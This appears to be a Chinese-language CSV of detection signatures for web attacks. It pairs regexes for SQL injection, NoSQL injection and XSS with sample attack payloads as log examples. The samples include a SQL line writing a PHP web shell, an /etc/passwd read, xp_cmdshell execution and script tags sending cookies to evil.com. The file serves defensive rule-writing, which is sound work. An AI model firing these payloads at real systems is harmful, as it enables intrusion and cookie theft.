ID,攻击类型,特征类型,检测场景,特征代码/Payload,典型日志样本(多个用|分隔),风险等级,标题,核心内容,来源链接
SQLi_001,SQL注入,正则,Web访问,updatexml\s*\(.*0x7e,"id=1' and updatexml(1,concat(0x7e,database()),1)-- | id=1' and updatexml(1,concat(0x7e,user()),1)# | id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables limit 1)),1)--",CRITICAL,报错型注入 (UpdateXML),利用 MySQL updatexml 函数报错回显数据库名。,https://github.com/coreruleset/coreruleset
SQLi_002,SQL注入,正则,Web访问,extractvalue\s*\(.*0x7e,"id=1' and extractvalue(1,concat(0x7e,version()))-- | id=1' and extractvalue(1,concat(0x7e,database()))# | id=1' and extractvalue(1,concat(0x7e,@@version))--",CRITICAL,报错型注入 (ExtractValue),利用 MySQL extractvalue 函数报错回显。,https://github.com/coreruleset/coreruleset
SQLi_003,SQL注入,正则,Web访问/日志分析,"(?i:sleep\s*\(.*?\)|benchmark\s*\(.*?\,.*?\))","id=1' and sleep(5)-- | id=1' and benchmark(10000000,sha1('x'))-- | id=1' and if(1=1,sleep(3),0)--",CRITICAL,时间盲注 (sleep/benchmark),利用 sleep() 或 benchmark() 造成响应延迟。,https://github.com/coreruleset/coreruleset
SQLi_004,SQL注入,正则,Web访问,(?i)union.*?select.*?from,"id=-1 union select 1,2,3 from users-- | id=1 union all select null,table_name,null from information_schema.tables-- | id=1' union select 1,@@version,3--",CRITICAL,Union 联合查询注入,UNION SELECT 联合查询用于从其他表提取数据。,https://github.com/coreruleset/coreruleset
SQLi_005,SQL注入,关键词,Web访问,information_schema|master\.\.sysdatabases|pg_catalog,id=1' union select table_name from information_schema.tables-- | id=1' and 1=2 union select column_name from information_schema.columns-- | id=1; select * from master..sysdatabases--,CRITICAL,常见数据库名/系统表,检测对 information_schema、sysdatabases 等系统元数据的访问。,https://github.com/coreruleset/coreruleset
SQLi_006,SQL注入,正则,Web访问,(?i)(?:select.*?pg_sleep|waitfor\s+delay),id=1; waitfor delay '0:0:5'-- | id=1' and pg_sleep(5)-- | id=1'; WAITFOR DELAY '0:0:3'--,CRITICAL,PostgreSQL/MSSQL 时间盲注,pg_sleep (PostgreSQL) 或 waitfor delay (MSSQL) 时间盲注。,https://github.com/coreruleset/coreruleset
SQLi_007,SQL注入,正则,Web访问,(?i)(?:or|and)\s+1\s*=\s*1,id=1' or 1=1-- | admin' OR '1'='1'-- | id=1 and 1=1 | ' or 1=1 #,CRITICAL,认证绕过 (OR 1=1),利用恒真条件绕过登录验证。,https://github.com/swisskyrepo/PayloadsAllTheThings
SQLi_008,SQL注入,正则,Web访问,(?i)into\s+(?:dump|out)file,"id=1' union select 1,'<?php system($_GET[c]);?>' into outfile '/var/www/shell.php'-- | id=1' union select load_file('/etc/passwd') into dumpfile '/tmp/x'--",CRITICAL,INTO OUTFILE 写文件,利用 INTO OUTFILE/DUMPFILE 将数据写入服务器文件。,https://github.com/coreruleset/coreruleset
SQLi_009,SQL注入,关键词,Web访问,xp_cmdshell|exec\s+master\.,id=1; exec master..xp_cmdshell 'whoami'-- | id=1'; EXEC xp_cmdshell('dir');--,CRITICAL,MSSQL xp_cmdshell,MSSQL 通过 xp_cmdshell 执行系统命令。,https://github.com/coreruleset/coreruleset
SQLi_010,SQL注入,正则,Web访问,(?i)\$\w+\s*:\s*\{|\[?\$\w+,user[$gt]=admin | user[$ne]=1 | ' || 1==1 || ',CRITICAL,MongoDB NoSQL 注入,检测 MongoDB 操作符如 $where、$gt 等注入。,https://github.com/coreruleset/coreruleset
SQLi_011,SQL注入,正则,Web访问,(?i)(?:--|\#|\/\*).*$,id=1'-- | id=1' # | id=1'/*comment*/ | id=1' or 1=1--+-,HIGH,SQL 注释符,检测 SQL 注释符用于截断后续查询。,https://github.com/swisskyrepo/PayloadsAllTheThings
SQLi_012,SQL注入,正则,Web访问,(?i)create\s+(?:function|procedure),id=1'; create procedure x() begin select 1; end-- | id=1'; create function f() returns int begin return 1; end--,CRITICAL,存储过程/函数注入,检测 CREATE FUNCTION/PROCEDURE 等结构操纵。,https://github.com/coreruleset/coreruleset
XSS_001,XSS,正则,Web访问,(?i)<script[^>]*>[\s\S]*?,<script>alert(1)</script> | <script>document.location='http://evil.com/?c='+document.cookie</script> | <script src=http://evil.com/x.js></script>,CRITICAL,script 标签向量,检测 script 标签及其内容。,https://github.com/coreruleset/coreruleset
